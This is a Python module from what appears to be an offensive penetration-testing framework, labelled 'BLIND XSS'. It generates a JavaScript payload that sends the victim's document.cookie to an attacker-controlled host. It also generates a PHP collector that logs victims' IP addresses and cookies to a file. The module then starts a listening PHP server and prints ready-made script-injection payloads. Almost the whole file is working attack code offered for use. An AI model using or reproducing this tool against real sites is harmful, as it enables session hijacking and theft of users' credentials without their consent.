import subprocess
from pathlib import Path

from core.attacker import resolve_lhost


PROVIDES = []
REQUIRES = []


def start_php_server(port):

    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'

    try:

        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                f"bash -c 'php -S 0.0.0.0:{port}; exec bash'"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(
            f"\n{G}[+]{W} "
            f"PHP server started on "
            f"{Y}{port}{W}"
        )

        return True

    except Exception as e:

        print(
            f"\n{R}[!] Failed to start PHP server:{W} {e}"
        )

        return False


def run(data, cred, args):

    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD = '\033[1m'

    lhost = resolve_lhost(args)
    port = getattr(args, "port", None) or 9200


    script_js = Path("script.js")
    index_php = Path("index.php")

    script_js.write_text(
        f"new Image().src='http://{lhost}:{port}/index.php?c='+document.cookie\n"
    )

    index_php.write_text(
        """<?php
if (isset($_GET['c'])) {
    file_put_contents(
        'cookies.txt',
        $_SERVER['REMOTE_ADDR'] .
        ' | ' .
        urldecode($_GET['c']) .
        PHP_EOL,
        FILE_APPEND
    );
}
?>
"""
    )

    print(
        f"\n{B}┌── {BOLD}MODULE: BLIND XSS{W}{B} ─────────────────────────────┐{W}"
    )
    print(
        f"{B}│{W}  {B}LHOST:{W} {C}{str(lhost):<40}{W}{B}│{W}"
    )
    print(
        f"{B}│{W}  {B}PORT:{W}  {C}{str(port):<40}{W}{B}│{W}"
    )
    print(
        f"{B}└──────────────────────────────────────────────────────────┘{W}"
    )

    print(
        f"\n{G}[+]{W} Generated:"
    )

    print(
        f"    {Y}{script_js}{W}"
    )

    print(
        f"    {Y}{index_php}{W}"
    )

    print(
        f"\n{B}[{W}{G}*{W}{B}]{W} "
        f"{BOLD}STARTING PHP SERVER{W}"
    )

    print(
        f"\n{Y}php -S 0.0.0.0:{port}{W}"
    )

    cwd = Path.cwd()

    subprocess.Popen(
        [
            "x-terminal-emulator",
            "-e",
            (
                f"bash -c "
                f"'cd {cwd}/ && "
                f"php -S 0.0.0.0:{port}; "
                f"exec bash'"
            )
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    print(
        f"\n{G}[+]{W} PHP server launched."
    )

    print(
        f"\n{B}[{W}{G}*{W}{B}]{W} "
        f"{BOLD}TEST PAYLOAD{W}\n"
    )

    print(
        f'"><script src=http://{lhost}:{port}/TESTING_THIS></script>'
    )

    print(
        f"\n{B}[{W}{G}*{W}{B}]{W} "
        f"{BOLD}COOKIE PAYLOAD{W}\n"
    )

    print(
        f'"><script src=http://{lhost}:{port}/script.js></script>'
    )

    print(
        f"\n{B}[{W}{G}*{W}{B}]{W} "
        f"{BOLD}COOKIE OUTPUT{W}\n"
    )

    print(
        f"tail -f /cookies.txt"
    )

    print()
